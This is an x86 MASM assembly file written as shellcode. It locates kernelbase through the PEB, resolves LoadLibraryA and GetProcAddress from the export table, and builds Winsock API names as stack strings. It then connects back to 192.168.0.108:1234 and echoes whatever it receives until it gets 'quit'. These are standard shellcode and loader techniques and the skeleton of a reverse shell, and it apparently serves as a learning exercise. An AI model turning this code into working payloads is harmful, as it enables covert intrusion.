.386
	.model flat,stdcall


	;includelib masm32\lib\kernel32.lib

	;GetStdHandle PROTO STDCALL :DWORD

	;ExitProcess PROTO STDCALL :DWORD
	;WriteConsoleA PROTO STDCALL :DWORD,:DWORD,:DWORD,:DWORD,:DWORD

	;extrn GetStdHandle@4 :PROC :DWORD
	;extrn WriteConsole@20 PROTO :DWORD, :DWORD, :DWORD, :DWORD, :DWORD


	.data
		pebaddress dd 0
		mybase dd 0
		ldr dd 0
		ntdlladdr dd 0
		pi db 16 dup(0)
		s1 db "calc.exe",0
		s1len equ $-s1
		s2 db "ABCA"
		srcfunc db "CreateProcessA"
		srcfunclen equ $-srcfunc
		exports dd 0
		
	.code
	
		main:
			
			push ebp
			mov ebp, esp 
			sub esp, 64h	; 100 bytes to store our addresses

			; fs:30h contains peb address
			ASSUME fs:NOTHING
			xor eax, eax
			mov eax,DWORD PTR fs:[eax+30h]
			ASSUME fs:ERROR

		
			;mov pebaddress, eax
		
			; pointer to Ldr _peb_ldr_data 
			add eax, 0ch
		
			xor ebx, ebx
			mov eax, DWORD PTR [eax+ebx]
			;mov ldr,eax
		
			; peb_ldr_data + 0x1c gives pointer to 
			; InInitializationModuleList which contains
			; ntdll.dll, kernelbase.dll, kernel32.dll in order
			;mov eax,ldr
			add eax, 1ch

			; InInitializationOrderLinks is 0x10 away from ldr_data_table_entry
			mov eax, DWORD PTR [eax+ebx]
			;sub eax, 10h
			
			mov eax, DWORD PTR [eax+ebx]
			sub eax, 10h
			add eax, 18h
			mov eax, DWORD PTR [eax+ebx]
			; eax points to kernelbase.dll

			; ebp-4 = kernelbase.dll base address
			mov DWORD PTR [ebp-4], eax

			xor esi, esi 
			push esi
			; 43726561 74655072 6f63 6573 7341 CreateProcessA
			; 4c6f6164 4c696272 61727941 LoadLibraryA
		
			push 41797261h
			push 7262694ch
			push 64616f4ch
			mov esi, esp
			push 12
			push esi 
			push eax
			call getexportedfunction
			; eax contains LoadLibraryA function address
			add esp, 16


			; ebp-8 = LoadLibraryA address
			mov DWORD PTR [ebp-8], eax
			


			; 47657450 726f6341 64647265 7373 GetProcAddress
			xor esi, esi 
			push si
			mov si, 7373h
			push si
			push 65726464h
			push 41636f72h
			push 50746547h
			mov esi, esp
			push 14
			push esi 
			push DWORD PTR [ebp-4]
			call getexportedfunction	
			; eax contains address of GetProcAddress
			
			; ebp-12 = GetProcAddress
			mov DWORD PTR [ebp-12], eax
			add esp, 16



			; 7773325f 33322e64 6c6c ws2_32.dll
			xor esi, esi
			push si
			mov si, 6c6ch
			push si
			push 642e3233h
			push 5f327377h
			push esp 
			call DWORD PTR [ebp-8]	; LoadLibraryA(ws2_32.dll)
			; ebp-16 = ws2_32.dll handle baseaddress
			mov DWORD PTR [ebp-16], eax
			add esp, 12


			; 57534153 74617274 7570 WSAStartup
			xor esi, esi 
			push si
			mov si, 7075h
			push si
			push 74726174h
			push 53415357h
			push esp 
			push DWORD PTR [ebp-16]	;push ws2_32dllbase
			call DWORD PTR [ebp-12] ; push getprocaddress address
			; ebp-20 = WSAStartup
			mov DWORD PTR [ebp-20], eax
			add esp, 12



			; 57534153 6f636b65 7441 WSASocketA
			xor esi, esi 
			push si
			mov si, 4174h
			push si 
			push 656b636fh
			push 53415357h
			push esp 
			push DWORD PTR [ebp-16]	;push ws2_32dllbase
			call DWORD PTR [ebp-12] ; push getprocaddress
			; ebp-28 = WSASocketA
			mov DWORD PTR [ebp-28], eax
			add esp, 12




			; 57534143 6c65616e 7570 WSACleanup
			xor esi, esi 
			push si 
			mov si, 7075h
			push si
			push 6e61656ch
			push 43415357h
			push esp 
			push DWORD PTR [ebp-16]	;push ws2_32dllbase
			call DWORD PTR [ebp-12] ; push getprocaddress
			; ebp-24 = WSACleanup
			mov DWORD PTR [ebp-24], eax
			add esp, 12


			; 57534143 6f6e6e65 6374 WSAConnect
			xor esi, esi 
			push si
			mov si, 7463h
			push si
			push 656e6e6fh
			push 43415357h
			push esp 
			push DWORD PTR [ebp-16]	;push ws2_32dllbase
			call DWORD PTR [ebp-12] ; push getprocaddress
			add esp, 12
			; ebp-32 = WSAConnect
			mov DWORD PTR [ebp-32], eax



			; 696e6574 5f616464 72 inet_addr
			xor esi, esi 
			push esi 
			mov BYTE PTR [esp], 72h
			push 6464615fh
			push 74656e69h
			push esp 
			push DWORD PTR [ebp-16]	;push ws2_32dllbase
			call DWORD PTR [ebp-12] ; push getprocaddress
			; ebp-36 = inet_addr
			mov DWORD PTR [ebp-36], eax
			add esp, 12


			; 68746f6e 73 htons
			xor esi, esi 
			push esi 
			mov BYTE PTR [esp], 73h
			push 6e6f7468h
			push esp 
			push DWORD PTR [ebp-16]	;push ws2_32dllbase
			call DWORD PTR [ebp-12] ; push getprocaddress
			; ebp-40 = htons
			mov DWORD PTR [ebp-40], eax
			add esp, 8


			


			; ebp-20 WSAStartup
			; wsadata structure size is 20
			xor esi, esi 
			mov ecx, 5
			l1:
				push esi 
				LOOP l1
			push esp 
			mov esi, 0202h
			push esi
			call DWORD PTR [ebp-20]	; WSAStartup
			add esp, 20


			; ebp-28 WSASocketA
			xor esi, esi 
			push esi 
			push esi 
			push esi 
			mov si, 6		; IPPROTO_TCP = 6
			push esi 
			xor esi, esi 
			inc si			; SOCK_STREAM = 1
			push esi 
			inc si			; AF_INET = 2
			push esi 
			call DWORD PTR [ebp-28] ; WSASocketA
			; eax contains socket descriptor
			mov DWORD PTR [ebp-60], eax


			; 3139322e 3136382e 302e3130 38 192.168.0.108
			xor esi, esi 
			push esi
			mov BYTE PTR [esp],38h
			push 30312e30h
			push 2e383631h
			push 2e323931h
			push esp 
			call DWORD PTR [ebp-36]	; inet_addr
			; eax contains network byte order of ip address
			mov edi, eax 
			add esp, 16

			xor esi, esi 
			mov si, 1234
			push esi
			call DWORD PTR [ebp-40]	; htons
			;add esp, 2


			; ebp-32 WSAConnect
			; sockaddr_in is 16bytes
			xor esi, esi
			
			push esi 
			push esi 
			push edi
			;push 0c0a8006ch	; 192.168.0.108
			mov si, ax	; 1234
			push si
			mov si, 2 
			push si
			mov esi, esp 
			
			xor ecx, ecx
			push ecx 
			push ecx 
			push ecx 
			push ecx 
			push 16					; len(sockaddr_in)
			push esi				; sockaddr_in address
			push DWORD PTR [ebp-60]	; push socket descriptor
			CALL DWORD PTR [ebp-32]	; WSAConnect
			add esp, 16



			; 57534152 656376 WSARecv
			xor esi, esi 
			push 766365h
			push 52415357h
			push esp 
			push DWORD PTR [ebp-16]	;push ws2_32dllbase
			call DWORD PTR [ebp-12] ; push getprocaddress
			mov DWORD PTR [ebp-44], eax
			; ebp-44 contains WSARecv
			add esp, 8


			; 57534153 656e64  WSASend
			xor esi, esi 
			push 646e65h
			push 53415357h
			push esp 
			push DWORD PTR [ebp-16]	;push ws2_32dllbase
			call DWORD PTR [ebp-12] ; push getprocaddres
			mov DWORD PTR [ebp-48],eax 
			; ebp-48 = WSASend address
			add esp, 8

	msgloop:
			; making space of 1024 bytes on stack
			; to receive data
			xor esi, esi 
			mov ecx, 256
			l3:
				push esi 
				LOOP l3
			xor ecx, ecx
			push esp	; pointer to 1024 bytes buffer
			push 1024	; length of buffer
			mov esi, esp	; pointer to WSABuf structure
			push ecx		; number of bytes read
			mov edi, esp	; edi contains address of number of bytes read variable
			push ecx		; flags
			;mov BYTE PTR [esp], 2
			mov ebx, esp	; address of flags
			xor eax, eax 
			mov ecx, 5		; allocating overlap 20 bytes
			l5:
				
				push eax 
				loop l5
			mov edx, esp
			; function parameters
			push ecx		; completionroutine
			push edx		; overlapped
			push ebx		; flags
			push edi		; number of bytes read 
			inc cl
			push ecx		; number of wsabuf = 1
			push esi		; wsabuf pointer
			push DWORD PTR [ebp-60]	; socket descriptor 
			call DWORD PTR [ebp-44]	; calling WSARecv
			;add esp, 1024+12


			; checking if incoming msg is "quit"
		
			mov ecx, DWORD PTR [esi+4]	; address of buffer bytes
			mov ecx, DWORD PTR [ecx]	; reading first 4 bytes
			cmp ecx, 74697571h ; 'quit'
			je quitting


			
			xor ecx, ecx 
			push ecx
			push ecx 
			push ecx 
			push edi		; number of bytes read 
			inc cl
			push ecx		; number of wsabuf = 1
			push esi		; wsabuf pointer
			push DWORD PTR [ebp-60]	; socket descriptor 
			call DWORD PTR [ebp-48]	; calling WSASend
			add esp, 1024+36
			jmp msgloop	


		quitting:
			add esp, 1024+36

			call DWORD PTR [ebp-24] ; WSACleanup

			add esp, 64h
			pop ebp
			ret







			; (baseaddressofdll, addressoffunctionname,
			; lengthoffunctionname)
			getexportedfunction PROC	
				; getexportedfunction( dllbaseaddress,
				; addressoffunctionnamestring, functionnamelength)
				push ebp
				mov ebp, esp
				push ebx 
				push esi
				push edi 
				push ecx 
				push edx 


				mov ebx, DWORD PTR [ebp+8]
				mov ebx, DWORD PTR [ebx+60]
				add ebx, DWORD PTR [ebp+8]
				add ebx, 78h
				mov ebx, DWORD PTR [ebx]
				add ebx, DWORD PTR [ebp+8]


			

				; ecx = number of names
				mov ecx, DWORD PTR [ebx+24]
				inc ecx

				; esi = address of names
				mov esi, DWORD PTR [ebx+32]
				add esi, DWORD PTR [ebp+8]

				xor edx, edx
			
				loop2:
					mov edi, DWORD PTR [esi+edx*4]
					add edi, DWORD PTR [ebp+8]
				 

					push DWORD PTR [ebp+16]
					push edi 
					push DWORD PTR [ebp+12]
					call comparetwostrings 
					cmp eax, 1
					je foundstring 
					inc edx 
					dec ecx
					cmp ecx,1
					jne loop2
					xor eax, eax
					jmp myEpilogue	


			foundstring:
				; edx contains index to nameordinals
				xor ecx, ecx
				mov esi,DWORD PTR [ebx+36]
				add esi,DWORD PTR [ebp+8]
				mov cx, WORD PTR [esi+edx*2]

				mov esi, DWORD PTR [ebx+28]
				add esi, DWORD PTR [ebp+8]
				mov esi, DWORD PTR [esi+ecx*4]
				; esi contains function address
				add esi, DWORD PTR [ebp+8]
				mov eax, esi
				jmp myEpilogue	

			myEpilogue:
			
				pop edx 
				pop ecx 
				pop edi 
				pop esi 
				pop ebx 
				pop ebp 
				ret 12
		getexportedfunction endp

			
			comparetwostrings PROC
			; comparetwostrings( addressofstring1,
			; addressofstring2, lengthofstring1)
				push ebp 
				mov ebp, esp
				push esi
				push edi 
				push edx
				push ecx
				push ebx

				; ebp+4 gives the address of next instruction
				; ebp+8 gives first parameter
				; ebp+12 gives the second parameter
				; ebp+ 16 gives the length to check
				
				mov esi, DWORD PTR [ebp+8]
				mov edi, DWORD PTR [ebp+12]
				mov ecx, DWORD PTR [ebp+16]
				inc ecx

				xor edx,edx 
				xor ebx, ebx

				loop1:
					mov bl, BYTE PTR [esi+edx]
					mov bh, BYTE PTR [edi+edx]
					inc edx
					dec ecx 
					cmp bl,bh
					jne notequal

					cmp ecx,1
					jne loop1
					xor eax, eax
					inc al
					jmp Epilogue

				notequal:
					xor eax, eax
					jmp Epilogue

				Epilogue:
					pop ebx
					pop ecx
					pop edx
					pop edi 
					pop esi
					pop ebp 
					ret 12

			comparetwostrings endp
			 

			
		end main
